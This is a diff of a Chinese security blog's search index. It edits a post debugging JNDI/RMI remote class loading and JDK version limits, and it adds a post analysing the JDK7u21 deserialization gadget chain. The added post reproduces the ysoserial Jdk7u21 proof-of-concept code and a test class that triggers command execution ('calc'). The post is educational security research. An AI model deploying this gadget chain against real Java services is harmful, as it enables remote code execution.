@@ -2851,27 +2851,27 @@
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164110192-943870745.png" alt="image-20220617164109795"></p>
 <h3 id="JNDI-RMI调试分析"><a href="#JNDI-RMI调试分析" class="headerlink" title="JNDI+RMI调试分析"></a>JNDI+RMI调试分析</h3><p>在lookup函数处打上断点</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164309402-241499107.png" alt="image-20220617164309349"></p>
-<p>跟进rmiURLContext#lookup</p>
+<p>跟进<code>rmiURLContext#lookup</code></p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164322491-1242926316.png" alt="image-20220617164322361"></p>
-<p>通过rmiURLContext#getRootURLContext拿到var2，var2如下，里面把包括远程主机和对应的端口，以及绑定对象的名字</p>
+<p>通过<code>rmiURLContext#getRootURLContext</code>拿到var2，var2如下，里面把包括远程主机和对应的端口，以及绑定对象的名字</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164753272-151728509.png" alt="image-20220617164753147"></p>
-<p>继续跟进var3#lookup</p>
+<p>继续跟进<code>var3#lookup</code></p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165035151-1967729845.png" alt="image-20220617165035321"></p>
-<p>通过this.registry#lookup方法拿到RMI绑定的对象</p>
+<p>通过<code>this.registry#lookup</code>方法拿到RMI绑定的对象</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165354472-424846252.png" alt="image-20220617165354526"></p>
-<p>向下，跟进decodeObject()方法</p>
+<p>向下，跟进<code>decodeObject()</code>方法</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165531472-280695840.png" alt="image-20220617165531724"></p>
 <p>这里先判断var1是否是<code>ReferenceWrapper</code>类的对象，它<code>implements RemoteReference</code>了，所以会调用<code>getReference()</code>，获取<code>Reference</code>对象</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172709689-478528339.png" alt="image-20220617172709570"></p>
 <p>进入<code>NamingManager.getObjectInstance</code>，前面通过一些if语句的判断，重点是下面这几行代码</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172958332-1022715033.png" alt="image-20220617172958249"></p>
-<p>跟进getObjectFactoryFromReference()函数，<code>clas = helper.loadClass(factoryName);</code>这里是本地类加载，因为找不到<code>Evil</code>类所以会加载失败。继续往下在<code>codebase = ref.getFactoryClassLocation()</code>中，<code>FactoryClassLocation</code>就是我们请求的URL，并赋值给<code>codebase</code>，下面就通过<code>URLClassLoader</code>远程加载类，跟进loadClass()方法，获取<code>URLClassLoader</code></p>
+<p>跟进<code>getObjectFactoryFromReference()</code>函数，<code>clas = helper.loadClass(factoryName);</code>这里是本地类加载，因为找不到<code>Evil</code>类所以会加载失败。继续往下在<code>codebase = ref.getFactoryClassLocation()</code>中，<code>FactoryClassLocation</code>就是我们请求的URL，并赋值给<code>codebase</code>，下面就通过<code>URLClassLoader</code>远程加载类，跟进<code>loadClass()</code>方法，获取<code>URLClassLoader</code></p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174419754-846853933.png" alt="image-20220617174420127"></p>
-<p>再跟进loadClass()方法，可以看到这里用<code>Class.forName</code>加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p>
+<p>再跟进<code>loadClass()</code>方法，可以看到这里用<code>Class.forName</code>加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174351473-1380822828.png" alt="image-20220617174351661"></p>
-<p>成功加载到了clas后，再return (clas !&#x3D; null) ? (ObjectFactory) clas.newInstance() : null;，调用它的newInstance()进行实例化，从而调用了无参构造器，执行了无参构造器里面的代码，因此可以将恶意代码放入无参构造器中。</p>
+<p>成功加载到了clas后，再<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>，调用它的newInstance()进行实例化，从而调用了无参构造器，执行了无参构造器里面的代码，因此可以将恶意代码放入无参构造器中。</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617173457303-1784389861.png" alt="image-20220617173457054"></p>
-<p>回到getObjectFactoryFromReference()调用处，继续往下，可以发现还会调用getObjectInstance()方法，因此也可以把代码写到<code>getObjectInstance</code>方法中</p>
+<p>回到<code>getObjectFactoryFromReference()</code>调用处，继续往下，可以发现还会调用<code>getObjectInstance()</code>方法，因此也可以把代码写到<code>getObjectInstance</code>方法中</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617175505587-983781106.png" alt="image-20220617175505727"></p>
 <p>调用链大致如下</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182136384-338384993.png" alt="image-20220617182136524"></p>
@@ -2890,15 +2890,14 @@
 
 <p>运行结果如下</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617223744211-553424588.png" alt="image-20220617223742062"></p>
-<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><h4 id="RMI版本限制"><a href="#RMI版本限制" class="headerlink" title="RMI版本限制"></a>RMI版本限制</h4><p>这里还需要说下在 当RMI客户端引用远程对象将受本地Java环境限制，即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p>
-<p>所以这里如果我们进行利用的话，客户端的RMI启动的时候就需要设置useCodebaseOnly</p>
-<p>java在6u45、7u21开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
-<p>在javasec中看到说是8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true</p>
+<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><h4 id="RMI版本限制"><a href="#RMI版本限制" class="headerlink" title="RMI版本限制"></a>RMI版本限制</h4><p>这里还需要说下在 当RMI客户端引用远程对象将受本地Java环境限制，即本地的<code>java.rmi.server.useCodebaseOnly</code>配置必须为<code>false</code>(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p>
+<p>所以这里如果我们进行利用的话，客户端的RMI启动的时候就需要设置<code>useCodebaseOnly</code></p>
+<p>java在6u45、7u21开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code>。</p>
+<p>在javasec中看到说是8u121开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code></p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617180421366-1985012742.png" alt="image-20220617180420743"></p>
-<p>除此之外被引用的ObjectFactory对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p>
+<p>除此之外被引用的<code>ObjectFactory</code>对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p>
 <p>rmi的jndi在6u132，7u122，8u113 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了false。</p>
-<p>如果想要通过rmi的jndi进行加载恶意类，在jdk8中，版本就可以适用到113</p>
-<p>JDK 6u141 <a href="http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141">http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</a><br>JDK 7u131 <a href="http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html">http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</a><br>JDK 8u121 <a href="http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html">http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</a></p>
+<p>如果想要通过rmi的jndi进行加载恶意类，在jdk8中，版本就可以适用到113。</p>
 <p>如下为jdk8u321的测试结果：</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182734589-490760347.png" alt="image-20220617182734089"></p>
 <h4 id="LDAP版本限制"><a href="#LDAP版本限制" class="headerlink" title="LDAP版本限制"></a>LDAP版本限制</h4><p>然后再说下ldap的jndi，ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false。</p>
@@ -2912,6 +2911,96 @@
       </categories>
       <tags>
         <tag>JNDI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java安全之Jdk7u21链分析</title>
+    <url>/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJdk7u21%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面的cc链都是第三方组件的利用链，现在学习下JDK7u21的原生反序列化链。</p>
+<span id="more"></span>
+
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>JDK7u21这个版本以及之前时间发布的所有Java版本都有问题。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618000917681-667491552.png" alt="image-20220618000915777"></p>
+<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>引入<code>javassist</code>，下面用到<code>javassist</code>就是为了方便生成恶意类的字节码，而且版本要低一些，高版本不兼容jdk7，只能用jdk8及其更高版本。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;<span class="number">7</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;<span class="number">7</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>7u21这条链核心就在于<code>AnnotationInvocationHandler</code>这个类。联想到CC1的时候第一次接触它，这个类有两种利用思路，一种是利用它的<code>readObject()</code>，另一种就是利用它的<code>invoke()</code>，因为<code>AnnotationInvocationHandler</code>是一个实现了<code>InvocationHandler</code>接口的类，可以应用于动态代理中。</p>
+<p>看下yso中给出的调用链</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (<span class="number">0</span>)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看下yso中的poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">		<span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">		Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">		<span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">		<span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(); <span class="comment">// maintain order</span></span><br><span class="line">		set.add(templates);</span><br><span class="line">		set.add(proxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">		Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">		map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> set;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>
+
+<p>进到方法中</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618173503665-1663655389.png" alt="image-20220618173503107"></p>
+<p>最后调用了它的重载方法，方法中，首先对传入的<code>TemplatesImpl</code>进行了实例化，然后用<code>javassist</code>动态创建了一个恶意类</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618173822265-841791307.png" alt="image-20220618173821584"></p>
+<p>最后这段代码使用了<code>Reflections.setFieldValue</code>把<code>templates</code>里面的<code>_bytecodes</code>设置为前面动态创建的类的字节码。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618180930411-355270625.png" alt="image-20220618180929673"></p>
+<p><code>setFieldValue()</code>是通过反射去实现的</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618181515069-1298862479.png" alt="image-20220618181513584"></p>
+<p>继续往下看</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182655940-1693753912.png" alt="image-20220618182654963"></p>
+<p>查看一下<code>Reflections.getFirstCtor</code>方法，内部就是使用反射创建一个无参构造的对象</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182812273-1966081817.png" alt="image-20220618182811857"></p>
+<p>传递的name就是<code>AnnotationInvocationHandler</code></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182952528-91648397.png" alt="image-20220618182952209"></p>
+<p><code>Reflections.getFirstCtor</code>方法返回<code>AnnotationInvocationHandler</code>对象，然后调用<code>newInstance</code>实例化该对象，传入构造方法中的参数是<code>Override.class</code>和<code>map</code>，这个在cc链学习的时候页接触到过这种传参方式。</p>
+<p>下面这段代码和之前一样通过反射将<code>tempHandler</code>里面的<code>type</code>的变量改成<code>Templates.class</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br></pre></td></tr></table></figure>
+
+<p>再来看到下一段代码,跟进一下<code>Gadgets.createProxy</code>方法，主要就最后一行，使用了<code>Templates</code>去做动态代理</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618184148530-1966438151.png" alt="image-20220618184148200"></p>
+<p>等价于下面的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Templates templates=(Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),Templates.class.getInterfaces(),invocationHandler);</span><br><span class="line">        Object object=constructor.newInstance(Override.class,templates);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接着往下看</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618192149052-791127900.png" alt="image-20220618192148678"></p>
+<p>实例化一个<code>LinkedHashSet</code>对象，并将<code>templates</code>和<code>proxy</code>添加进去。</p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>先编写一个测试类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.Jdk7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jdk7u21</span>().getObject(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(calc);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化输出----&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功触发</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618192949304-242290566.png" alt="image-20220618192948825"></p>
+<p>接下来分析下该利用链的具体调用过程，根据yso返回的是<code>LinkedHashSet</code>实例化对象，所以反序列化时先会调用<code>LinkedHashSet#readObject()</code>方法。</p>
+<p>可以看到并没有<code>readObject()</code>方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618194947351-181087664.png" alt="image-20220618194946775"></p>
+<p>查看下父类，发现继承了<code>HashSet</code></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618195104101-641953240.png" alt="image-20220618195103571"></p>
+<p>那么会调用<code>HashSet#readObject()</code>方法，在里面打个断点，这里调用了<code>map.put()</code>方法，跟进一下</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618202844926-1706817119.png" alt="image-20220618202844266"></p>
+<p>发现调用的是<code>HashMap#put()</code>方法，这里有个for循环，因为table数组是空的所以并不会进入循环中，下面会调用<code>addEntry</code>,将这几个值添加进去，hash的值为hash方法处理<code>TemplatesImpl</code>的值，key为<code>TemplatesImpl</code>的实例对象，value则是一个空的Object对象，i参数为<code>indexFor</code>方法处理hash后的结果。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618203844306-1455246806.png" alt="image-20220618203843843"></p>
+<p>返回之后，继续调用put方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204410694-552579046.png" alt="image-20220618204410352"></p>
+<p>此时table中有了值，所以进入for循环</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204601345-924320972.png" alt="image-20220618204600793"></p>
+<p>这里的key为代理类，代理类执行方法时，会触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法执行</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204744583-1951323441.png" alt="image-20220618204744027"></p>
+<p>这里通过if判断后，会调用<code>equalsImpl()</code>方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618205445366-690404709.png" alt="image-20220618205444743"></p>
+<p>进入方法中，可以看到这里会通过反射调用 <code>var1</code> 对象的 <code>var5</code> 方法，此时<code>var1</code>为<code>TemplatesImpl</code>，<code>var5</code>是名为<code>newTransformer</code>的<code>Method</code>对象</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618211236797-637088163.png" alt="image-20220618211236270"></p>
+<p>那么这里是怎么获取var5的呢，可以看到上面通过<code>getMemberMethods()</code>方法拿到Method类类型的数组，跟进这个方法看一下。通过反射拿到this.type对象的方法，这里的type为<code>templates</code>对象</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618211429646-1493626930.png" alt="image-20220618211429288"></p>
+<p>这里返回了两个方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618221119175-668285203.png" alt="image-20220618221118759"></p>
+<p>然后拿到这两个方法之后，就会进入for循环，通过<code>var8 = var5.invoke(var1);</code>分别通过反射调用这两个方法，var1就是<code>TemplatesImpl</code>的实例对象。也就是说会调用<code>TemplatesImpl#getOutputProperties()</code>方法，后面的调用步骤和走之前CC链利用<code>TemplatesImpl</code>构造恶意类的调用时一样的。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618212154096-356263688.png" alt="image-20220618212153754"></p>
+<p>往下就是之前<code>TemplatesImpl</code>的调用链了，<code>getOutputProperties</code>方法会去调用<code>newTransformer</code>方法，<code>newTransformer</code>又会去调用<code>getTransletInstance</code>方法。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618212439063-180962652.png" alt="image-20220618212438318"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14026849.html">https://www.cnblogs.com/nice0e3/p/14026849.html</a></p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>利用链</tag>
       </tags>
   </entry>
 </search>
